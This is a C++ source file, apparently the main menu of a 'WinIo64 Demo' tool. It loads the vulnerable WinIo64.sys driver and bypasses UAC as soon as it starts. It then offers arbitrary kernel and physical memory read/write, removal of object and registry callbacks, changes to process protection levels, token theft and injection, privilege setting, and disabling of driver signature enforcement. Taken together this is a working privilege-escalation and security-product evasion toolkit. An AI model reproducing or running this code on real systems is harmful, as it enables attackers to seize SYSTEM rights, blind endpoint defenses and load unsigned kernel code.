#include "WinIo.h"
#include "kernel.h"
#include "utils.h"
#include "physmem.h"
#include "uacbypass.h"
#include "log.h"
#include <cstdlib>
#include <cctype>
#include <vector>

static void HexDump(const void* data, size_t size, ULONG64 base) {
    auto* p = (const uint8_t*)data;
    for (size_t i = 0; i < size; i += 16) {
        printf("  %08llX: ", base + i);
        for (size_t j = 0; j < 16 && i + j < size; j++)
            printf("%02X ", p[i + j]);
        for (size_t j = 0; j < 16 && i + j < size; j++)
            printf("%c", isprint(p[i + j]) ? p[i + j] : '.');
        printf("\n");
    }
}

static bool ReadHexBytes(std::vector<uint8_t>& out) {
    printf("Hex bytes (space-separated, empty=abort):\n> ");
    int c;
    while ((c = getchar()) != '\n' && c != EOF) {}
    char line[4096] = {};
    if (!fgets(line, sizeof(line), stdin))
        return false;

    out.clear();
    const char* p = line;
    while (*p) {
        while (*p && isspace((unsigned char)*p)) p++;
        if (!*p) break;

        char* end = nullptr;
        unsigned long val = strtoul(p, &end, 16);
        if (end == p) break;
        if (val > 0xFF) break;

        out.push_back((uint8_t)val);
        p = end;
    }
    return !out.empty();
}

int main() {

#ifdef _WIN32
    HANDLE hOut = GetStdHandle(STD_OUTPUT_HANDLE);
    DWORD dwMode = 0;
    GetConsoleMode(hOut, &dwMode);
    SetConsoleMode(hOut, dwMode | ENABLE_VIRTUAL_TERMINAL_PROCESSING);
#endif

    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);

    UACBypassSelf();

    WinIo drv;

    if (!drv.Open()) {
        LOG_INFO("Device not open, trying to load driver...");
        if (!drv.Load() || !drv.Open()) {
            LOG_ERR("Make sure WinIo64.sys is in the same directory.");
            system("pause");
            return 1;
        }
    }

    LOG_INFO("=== WinIo64 driver connected ===");
    printf("Device: \\\\.\\WinIo\n\n");

    InitKernel(&drv);
    printf("\n");

    while (true) {
        printf("\n===== WinIo64 Demo =====\n");
        printf("  1. Read physical memory\n");
        printf("  2. Write physical memory\n");
        printf("  3. Read virtual memory (VA->PA walk)\n");
        printf("  4. Write virtual memory (VA->PA walk)\n");
        printf("  5. Read process CR3\n");
        printf("  6. VirtToPhys\n");
        printf("  7. Read I/O port\n");
        printf("  8. Write I/O port\n");
        printf("  9. Remove ObCallback\n");
        printf(" 10. Remove CmCallback\n");
        printf(" 11. Get/SetPPL\n");
        printf(" 12. StealToken\n");
        printf(" 13. Get/SetTokenPrivileges\n");
        printf(" 14. GetKernelImportSymbol\n");
        printf(" 15. GetKernelExportSymbol\n");
        printf(" 16. DisableDriverSignature\n");
        printf(" 17. Exit\n");
        printf("Choice: ");

        int choice;
        if (scanf_s("%d", &choice) != 1) break;
        if (choice == 17) break;

        switch (choice) {
        case 1: {
            ULONG64 addr;
            ULONG64 size;
            printf("Physical address (hex): ");
            scanf_s("%llx", &addr);
            printf("Bytes to read (hex): ");
            scanf_s("%llx", &size);

            std::vector<uint8_t> buf(size);
            if (drv.ReadPhysicalMemory(addr, buf.data(), size)) {
                printf("\nPhysical %08llX (%llu bytes):\n", addr, size);
                HexDump(buf.data(), size, addr);
            } else {
                LOG_ERR("Read failed");
            }
            break;
        }

        case 2: {
            ULONG64 addr;
            printf("Physical address (hex): ");
            scanf_s("%llx", &addr);

            std::vector<uint8_t> data;
            if (ReadHexBytes(data)) {
                if (drv.WritePhysicalMemory(addr, data.data(), data.size()))
                    LOG_OK("Wrote %zu bytes to phys 0x%llX", data.size(), addr);
                else
                    LOG_ERR("Write failed");
            }
            break;
        }

        case 3: {
            ULONG64 va, cr3;
            ULONG64 size;
            printf("Virtual address (hex): ");
            scanf_s("%llx", &va);
            printf("CR3 (hex, 0=use kernel CR3): ");
            scanf_s("%llx", &cr3);
            printf("Bytes to read (hex): ");
            scanf_s("%llx", &size);

            if (!cr3) cr3 = GetKernelCr3();
            std::vector<uint8_t> buf(size);
            if (drv.ReadVirtualMemory(cr3, (const void*)va, buf.data(), size)) {
                printf("\nVirtual %p (%llu bytes):\n", (void*)va, size);
                HexDump(buf.data(), size, va);
            } else {
                LOG_ERR("Virtual read failed");
            }
            break;
        }

        case 4: {
            ULONG64 va, cr3;
            printf("Virtual address (hex): ");
            scanf_s("%llx", &va);
            printf("CR3 (hex, 0=use kernel CR3): ");
            scanf_s("%llx", &cr3);
            if (!cr3) cr3 = GetKernelCr3();

            std::vector<uint8_t> data;
            if (ReadHexBytes(data)) {
                if (drv.WriteVirtualMemory(cr3, (void*)va, data.data(), data.size()))
                    LOG_OK("Wrote %zu bytes to virt %p", data.size(), (void*)va);
                else
                    LOG_ERR("Write failed");
            }
            break;
        }

        case 5: {
            DWORD pid;
            printf("PID: ");
            scanf_s("%lu", &pid);
            ULONG64 eprocess = GetProcessByPid(pid);
            if (!eprocess) {
                LOG_ERR("PID %lu not found", pid);
                break;
            }
            ULONG64 cr3 = 0;
            if (KVMRead(eprocess + 0x28, &cr3, sizeof(cr3)))
                printf("PID %lu  EPROCESS=0x%llX  CR3=0x%llX\n", pid, eprocess, cr3);
            else
                LOG_ERR("Failed to read DirectoryTableBase");
            break;
        }

        case 6: {
            ULONG64 va, cr3;
            printf("Virtual address (hex): ");
            scanf_s("%llx", &va);
            printf("CR3 (hex, 0=use kernel CR3): ");
            scanf_s("%llx", &cr3);
            if (!cr3) cr3 = GetKernelCr3();
            ULONG64 pa = VirtToPhys(&drv, cr3, va);
            if (pa)
                printf("VA 0x%llX -> PA 0x%llX\n", va, pa);
            else
                LOG_ERR("Translation failed");
            break;
        }

        case 7: {
            WORD port;
            int width;
            printf("Port number (hex): ");
            scanf_s("%hx", &port);
            printf("Width (1=BYTE, 2=WORD, 4=DWORD): ");
            scanf_s("%d", &width);

            DWORD val = drv.ReadPort(port, (BYTE)width);
            switch (width) {
                case 1: printf("Port 0x%04X: 0x%02X (%u)\n", port, val, val); break;
                case 2: printf("Port 0x%04X: 0x%04X (%u)\n", port, val, val); break;
                case 4: printf("Port 0x%04X: 0x%08X (%u)\n", port, val, val); break;
            }
            break;
        }

        case 8: {
            WORD port;
            DWORD data;
            int width;
            printf("Port number (hex): ");
            scanf_s("%hx", &port);
            printf("Data (hex): ");
            scanf_s("%x", &data);
            printf("Width (1=BYTE, 2=WORD, 4=DWORD): ");
            scanf_s("%d", &width);

            if (drv.WritePort(port, data, (BYTE)width))
                LOG_OK("Port 0x%04X write OK", port);
            else
                LOG_ERR("Port write failed");
            break;
        }

        case 9: {
            printf("Object type names (space-separated, e.g. PsProcessType PsThreadType):\n> ");
            int c;
            while ((c = getchar()) != '\n' && c != EOF) {}
            char line[4096] = {};
            if (!fgets(line, sizeof(line), stdin) || line[0] == '\n') {
                LOG_ERR("No input.");
                break;
            }
            wchar_t wbuf[256] = {};
            const char* p = line;
            while (*p) {
                while (*p && isspace((unsigned char)*p)) p++;
                if (!*p) break;
                const char* start = p;
                while (*p && !isspace((unsigned char)*p)) p++;
                size_t len = p - start;
                if (len >= 256) len = 255;
                MultiByteToWideChar(CP_ACP, 0, start, (int)len, wbuf, 256);
                wbuf[len] = 0;
                printf("\n");
                DisableObTypeCallbacks(wbuf);
            }
            break;
        }

        case 10:
            RemoveCmCallback();
            break;

        case 11: {
            DWORD pid;
            int prot;
            printf("PID: ");
            scanf_s("%lu", &pid);
            printf("Protection (hex, -1=read-only, e.g. 0x40=WinTcb): ");
            scanf_s("%x", &prot);
            SetPPL(pid, prot);
            break;
        }

        case 12: {
            DWORD srcPid, dstPid;
            printf("Source PID (steal token from): ");
            scanf_s("%lu", &srcPid);
            printf("Target PID (inject token to): ");
            scanf_s("%lu", &dstPid);
            StealToken(srcPid, dstPid);
            break;
        }

        case 13: {
            DWORD pid;
            ULONG64 priv;
            printf("PID: ");
            scanf_s("%lu", &pid);
            printf("Target Privileges (hex, -1=read-only, e.g. 0x1ff2ffffbc): ");
            scanf_s("%llx", &priv);
            SetTokenPrivileges(pid, priv);
            break;
        }

        case 14: {
            wchar_t dllName[256] = {};
            wchar_t funcName[256] = {};
            printf("DLL name (e.g. hal.dll): ");
            scanf_s("%ls", dllName, (unsigned)_countof(dllName));
            printf("Function name: ");
            scanf_s("%ls", funcName, (unsigned)_countof(funcName));

            ULONG64 addr = GetImportedDllFunctionViaIDT(dllName, funcName);
            if (addr)
                printf("'%ls!%ls' = 0x%llX\n", dllName, funcName, addr);
            break;
        }

        case 15: {
            wchar_t name[256] = {};
            printf("Export name (e.g. PsInitialSystemProcess): ");
            scanf_s("%ls", name, (unsigned)_countof(name));
            ULONG64 addr = GetSystemRoutineAddress(name);
            if (addr)
                printf("'%ls' = 0x%llX\n", name, addr);
            break;
        }

        case 16:
            if (DisableDriverSignature()) {
                printf("\nPress ENTER to restore driver signature enforcement...\n");
                getchar(); while (getchar() != '\n') {}
                RestoreDriverSignature();
            }
            break;

        default:
            LOG_ERR("Invalid choice");
        }
    }

    return 0;
}
